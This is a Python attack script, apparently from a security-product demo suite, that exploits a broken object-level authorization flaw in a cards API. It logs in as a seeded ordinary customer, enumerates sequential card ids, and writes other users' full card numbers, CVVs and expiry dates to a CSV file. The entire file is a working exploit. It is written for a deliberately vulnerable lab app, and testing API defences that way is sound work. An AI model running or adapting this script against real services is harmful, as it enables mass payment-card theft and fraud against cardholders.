"""
card_harvesting.py — walk the BOLA cards endpoint to steal full PANs + CVVs.

Vuln / bot scenario:  GET /api/cards/cards/{id} has no ownership check, uses
                      sequential integer ids, and returns the FULL 16-digit card
                      number, the CVV and the expiry — not a masked view.
F5 XC category:       API Security: Broken Object Level Authorization (BOLA) +
                      Sensitive Data Exposure  (cardholder-data theft).

Logs in as an ordinary customer and walks card ids, writing full PAN, CVV and
expiry into a CSV. This is the cards-service analogue of account_scraping.

Usage:
    python3 card_harvesting.py                        # ids 1..10 as alice
    python3 card_harvesting.py --user dave --max-id 8 --out cards.csv
"""

import argparse
import csv
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, SEEDED_USERS, auth_headers, login, make_client)


def main():
    ap = argparse.ArgumentParser(description="BOLA card-harvesting bot (PAN + CVV).")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--start-id", type=int, default=1)
    ap.add_argument("--max-id", type=int, default=10)
    ap.add_argument("--out", default="scraped_cards.csv")
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}/api/cards/cards/{{id}}  (logged in as {args.user})")
    print(f"walking ids {args.start_id}..{args.max_id}\n")

    rows, start = [], time.time()
    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)
        for i in range(args.start_id, args.max_id + 1):
            try:
                r = client.get(f"/api/cards/cards/{i}", headers=hdrs)
            except Exception as exc:  # noqa: BLE001
                print(f"  id {i}: ERR {exc}")
                continue
            if r.status_code == 200:
                rows.append(r.json())

    elapsed = time.time() - start
    with open(args.out, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["id", "user_id", "account_id", "card_number", "cvv", "expiry",
                    "card_type", "status", "spend_limit_cents"])
        for c in rows:
            w.writerow([c.get("id"), c.get("user_id"), c.get("account_id"),
                        c.get("card_number"), c.get("cvv"), c.get("expiry"),
                        c.get("card_type"), c.get("status"), c.get("spend_limit_cents")])

    print("--- report ---")
    print(f"harvested: {len(rows)} cards in {elapsed:.2f}s -> {args.out}")
    print("sample stolen cards (PAN truncated for the console; full PAN+CVV in the CSV):")
    for c in rows[:5]:
        pan = str(c.get("card_number", ""))
        masked = ("*" * 12 + pan[-4:]) if len(pan) >= 4 else pan
        print(f"  card {c.get('id'):>3} {masked}  exp {c.get('expiry')}  "
              f"cvv=*** ({c.get('card_type')}, {c.get('status')})")


if __name__ == "__main__":
    main()
